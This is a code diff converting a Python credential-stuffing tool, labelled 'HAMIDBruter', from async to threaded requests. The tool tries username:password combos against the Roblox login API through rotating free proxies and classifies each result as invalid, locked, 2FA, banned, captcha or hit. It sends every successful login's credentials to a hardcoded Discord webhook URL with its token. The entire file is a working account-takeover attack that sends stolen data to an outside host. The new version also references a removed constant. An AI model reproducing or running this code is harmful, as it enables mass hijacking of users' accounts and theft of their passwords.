@@ -1,49 +1,54 @@
 import os
 import json
 import random
-import aiofiles
-import aiohttp
-import asyncio
+import requests
 from colorama import Fore
-from aiohttp_retry import RetryClient, ExponentialRetry
+from concurrent.futures import ThreadPoolExecutor
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
-webhookURL = "https://discord.com/api/webhooks/1242832585025912923/G9C3sKE-k8Di-x7p0o9CSjasNUnoctQlE8VdL7ubLTWFHsSBEJcw5EPAchiubPUx6L_Q"
-PROXIES_FILE = "proxies.txt"
+webhookURL = "https://discord.com/api/webhooks/1244667210644066304/W-4xQX0OQiO0G4uUpKCSLbDeUv55VPk9ohj9m7nu-D0hxmSx0IquARgiF-tJbXx3mz4D"
 
-async def load_config():
-    async with aiofiles.open("config.json", mode='r') as f:
-        return json.loads(await f.read())
+def load_config():
+    with open("config.json") as f:
+        return json.load(f)
 
-async def load_proxies():
-    async with aiofiles.open(PROXIES_FILE, mode='r') as f:
-        proxies_content = await f.read()
-    proxies_list = proxies_content.splitlines()
-    return proxies_list
+def fetch_proxies():
+    url = "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&anonymity=Transparent&timeout=20000"
+    response = requests.get(url)
+    if response.status_code == 200:
+        proxies = response.text.strip().split('\n')
+        proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
+        with open("proxies.txt", "w") as f:
+            f.write('\n'.join(proxies))
+    else:
+        print(f"Failed to fetch proxies: {response.status_code}")
 
-async def write_output(file, text):
+def write_output(file, text):
     file_path = os.path.join(config["results_dir"], f"{file}.txt")
-    async with aiofiles.open(file_path, mode='a', encoding="utf-8", errors="ignore") as f:
-        await f.write(f"{text}\n")
+    with open(file_path, "a", encoding="utf-8", errors="ignore") as f:
+        f.write(f"{text}\n")
 
-async def write_hits(combo):
-    async with aiofiles.open("hits.txt", mode='a', encoding="utf-8", errors="ignore") as f:
-        await f.write(f"{combo}\n")
+def write_hits(combo):
+    with open("hits.txt", "a", encoding="utf-8", errors="ignore") as f:
+        f.write(f"{combo}\n")
 
-async def remove_combo_from_file(combo):
-    async with aiofiles.open(os.path.join("accounts.txt"), mode='r+') as f:
-        lines = await f.readlines()
-        await f.seek(0)
+def remove_combo_from_file(combo):
+    with open(os.path.join("accounts.txt"), "r+") as f:
+        lines = f.readlines()
+        f.seek(0)
         for line in lines:
             if line.strip() != combo:
-                await f.write(line)
-        await f.truncate()
+                f.write(line)
+        f.truncate()
 
-async def send_webhook_to_another(status, combo):
+
+def send_webhook_to_another(status, combo):
     credential, password = combo.split(":", 1)
     data = {
         "content": f"<@541337117826220035>",
         "embeds": [{
-            "title": "New hit!",
+            "title": f"New hit!",
             "color": 65280,
             "fields": [
                 {"name": ":bust_in_silhouette: Username", "value": f"```{credential}```", "inline": True},
@@ -55,60 +60,58 @@ async def send_webhook_to_another(status, combo):
             }
         }]
     }
-    async with aiohttp.ClientSession() as session:
-        await session.post(webhookURL, json=data)
+    requests.post(webhookURL, json=data)
 
-async def process_response(resp, combo):
+def process_response(resp, combo):
     global STATS
-    text = await resp.text()
-    if "Incorrect username or password" in text:
+    if "Incorrect username or password" in resp.text:
         STATS['INVALID'] += 1
         STATS['TOTAL'] += 1
-        await write_output("invalid", combo)
-        await remove_combo_from_file(combo)
-    elif "Account has been locked." in text or "Please use Social" in text:
+        write_output("invalid", combo)
+        remove_combo_from_file(combo)
+    elif "Account has been locked." in resp.text or "Please use Social" in resp.text:
         STATS['LOCKED'] += 1
         STATS['TOTAL'] += 1
-        await write_output("locked", combo)
-        await remove_combo_from_file(combo)
-    elif "You must pass the Security Question" in text or "twoStepVerificationData" in text:
+        write_output("locked", combo)
+        remove_combo_from_file(combo)
+    elif "You must pass the Security Question" in resp.text or "twoStepVerificationData" in resp.text:
         STATS['2FA'] += 1
         STATS['TOTAL'] += 1
-        await write_output("2fa", combo)
-        await remove_combo_from_file(combo)
-    elif "isBanned\":true" in text:
+        write_output("2fa", combo)
+        remove_combo_from_file(combo)
+    elif "isBanned\":true" in resp.text:
         STATS['BANNED'] += 1
         STATS['TOTAL'] += 1
-        await write_output("banned", combo)
-        await remove_combo_from_file(combo)
-    elif "displayName" in text:
+        write_output("banned", combo)
+        remove_combo_from_file(combo)
+    elif "displayName" in resp.text:
         try:
             cookie = resp.cookies[".ROBLOSECURITY"]
             if cookie:
                 STATS['HITS'] += 1
                 STATS['TOTAL'] += 1
-                await write_output("hits", combo)
-                await send_webhook_to_another("Hit", combo)
-                await remove_combo_from_file(combo)
+                write_output("hits", combo)
+                send_webhook_to_another("Hit", combo)
+                remove_combo_from_file(combo)
             else:
                 STATS['HITS'] += 1
                 STATS['TOTAL'] += 1
-                await write_output("hits", combo)
-                await send_webhook_to_another("Hit", combo)
-                await remove_combo_from_file(combo)
+                write_output("hits", combo)
+                send_webhook_to_another("Hit", combo)
+                remove_combo_from_file(combo)
         except Exception as e:
             STATS['HITS'] += 1
             STATS['TOTAL'] += 1
-            await write_output("hits", combo)
-            await send_webhook_to_another("Hit", combo)
-            await remove_combo_from_file(combo)
-    elif "Challenge is required to authorize the request" in text:
+            write_output("hits", combo)
+            send_webhook_to_another("Hit", combo)
+            remove_combo_from_file(combo)
+    elif "Challenge is required to authorize the request" in resp.text:
         STATS['CAPTCHA'] += 1
         STATS['TOTAL'] += 1
-        await write_output("captcha", combo)
+        write_output("captcha", combo)
     print_progress()
 
-async def worker(combos):
+def worker(combos):
     proxy = random.choice(proxies_list)
     
     headers = {
@@ -132,12 +135,31 @@ async def worker(combos):
         'RBXSource': 'rbx_acquisition_time=05/08/2024 15:01:03&rbx_acquisition_referrer=&rbx_medium=Social&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1'
     }
 
-    retry_options = ExponentialRetry(attempts=5)
-    async with RetryClient(raise_for_status=False, retry_options=retry_options) as session:
-        for combo in combos:
-            try:
-                credential, password = combo.split(":", 1)
-                async with session.post(
+    session = requests.Session()
+    retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
+    session.mount('https://', HTTPAdapter(max_retries=retries))
+
+    for combo in combos:
+        try:
+            credential, password = combo.split(":", 1)
+            resp = session.post(
+                url="https://auth.roblox.com/v2/login",
+                headers=headers,
+                cookies=cookies,
+                json={
+                    "ctype": "Username",
+                    "cvalue": credential,
+                    "password": password
+                },
+                proxies={"https": f"http://{proxy}"},
+                timeout=15
+            )
+
+            process_response(resp, combo)
+            
+            if "x-csrf-token" in resp.headers:
+                headers["x-csrf-token"] = resp.headers["x-csrf-token"]
+                resp = session.post(
                     url="https://auth.roblox.com/v2/login",
                     headers=headers,
                     cookies=cookies,
@@ -146,38 +168,20 @@ async def worker(combos):
                         "cvalue": credential,
                         "password": password
                     },
-                    proxy=f"http://{proxy}",
+                    proxies={"https": f"http://{proxy}"},
                     timeout=15
-                ) as resp:
+                )
+                process_response(resp, combo)
+        except Exception as e:
+            pass
 
-                    await process_response(resp, combo)
-                
-                    if "x-csrf-token" in resp.headers:
-                        headers["x-csrf-token"] = resp.headers["x-csrf-token"]
-                        async with session.post(
-                            url="https://auth.roblox.com/v2/login",
-                            headers=headers,
-                            cookies=cookies,
-                            json={
-                                "ctype": "Username",
-                                "cvalue": credential,
-                                "password": password
-                            },
-                            proxy=f"http://{proxy}",
-                            timeout=15
-                        ) as resp:
-                            await process_response(resp, combo)
-            except Exception as e:
-                print(f"Exception for combo {combo}: {e}")
-                continue
+    session.close()
 
 def print_progress():
     print(f'\r{Fore.LIGHTWHITE_EX}[HAMIDBruter] {Fore.GREEN}TOTAL: {STATS["TOTAL"]} | {Fore.CYAN}HITS: {STATS["HITS"]} | {Fore.LIGHTMAGENTA_EX}2FA: {STATS["2FA"]} | {Fore.YELLOW}Locked: {STATS["LOCKED"]} | {Fore.RED}Invalid: {STATS["INVALID"]} | {Fore.YELLOW}Captcha: {STATS["CAPTCHA"]}', end='', flush=True)
 
-async def main():
-    global config, proxies_list, STATS
-
-    config = await load_config()
+if __name__ == '__main__':
+    config = load_config()
     
     INPUT_DIR = config["input_dir"]
     RESULTS_DIR = config["results_dir"]
@@ -185,11 +189,10 @@ async def main():
     COMBOS_FILE = os.path.join(INPUT_DIR, config["combos_file"])
     THREAD_COUNT = config["thread_count"]
 
-    # Fetch proxies from the proxies file
-    proxies_list = await load_proxies()
+    fetch_proxies()
     
-    async with aiofiles.open(COMBOS_FILE, mode='r', encoding="utf-8", errors="ignore") as f:
-        combos_list = list(set(line.strip() for line in await f.readlines()))
+    proxies_list = open(PROXIES_FILE, "r").read().splitlines()
+    combos_list = list(set(line.strip() for line in open(COMBOS_FILE, "r", encoding="utf-8", errors="ignore").readlines()))
     
     STATS = {
         'TOTAL': 0,
@@ -201,11 +204,7 @@ async def main():
         'CAPTCHA': 0
     }
 
-    chunk_size = len(combos_list) // THREAD_COUNT
-    combos_chunks = [combos_list[i:i + chunk_size] for i in range(0, len(combos_list), chunk_size)]
-
-    tasks = [worker(chunk) for chunk in combos_chunks]
-    await asyncio.gather(*tasks)
-
-if __name__ == '__main__':
-    asyncio.run(main())
+    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
+        chunk_size = len(combos_list) // THREAD_COUNT
+        combos_chunks = [combos_list[i:i + chunk_size] for i in range(0, len(combos_list), chunk_size)]
+        executor.map(worker, combos_chunks)
